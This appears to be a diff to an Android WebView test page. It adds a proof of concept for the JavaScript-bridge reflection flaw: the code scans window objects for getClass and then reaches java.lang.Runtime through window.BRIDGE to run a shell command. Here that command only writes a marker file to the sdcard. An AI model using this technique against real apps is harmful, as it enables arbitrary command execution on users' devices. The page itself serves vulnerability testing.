@@ -9,12 +9,37 @@
 				document.getElementById('tx_content').value = native_msg;
 			}
 
+			function checkLeak() {
+				try {
+					for (var obj in window) {
+						var wo = window[obj];
+						if (wo != null && typeof(wo) == 'object') {
+							if ('getClass' in wo) {
+								wo.getClass();
+								console.log('getClass existed!!!');
+								execCMD(['/system/bin/sh', '-c', 'echo \"mwr\" > /mnt/sdcard/mwr___WO.txt']);
+								console.log('command executed success!!!');
+								document.getElementById('div_check_result').innerText = obj;
+							}
+						}
+					}					
+				} catch(e) {
+					console.error(e);
+				}
+			}
+
+			function execCMD(cmd) {
+                window.BRIDGE.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec(cmd);
+			}
+
 			function js2Native1() {
 				var tx_content_value = document.getElementById('tx_content').value;
 				console.log('tx_content_value: '  + tx_content_value);
 				try {
 					if (typeof(BRIDGE) != 'undefined') {
 						BRIDGE.js2Native(tx_content_value);
+						console.log('BRIDGE_class: ' + window.BRIDGE);
+						checkLeak();
 					}
 				} catch(e) {
 					console.error(e);
@@ -48,6 +73,9 @@
             background-color:#4772fc;
         }
 
+		blockquote {
+			color:#ff5f4b;
+		}
 
 
     </style>
@@ -63,6 +91,7 @@
     &nbsp;
     <button onclick="js2Native3();">send3</button>
 
+    <blockquote id="div_check_result"></blockquote>
 </body>
 
 </html>
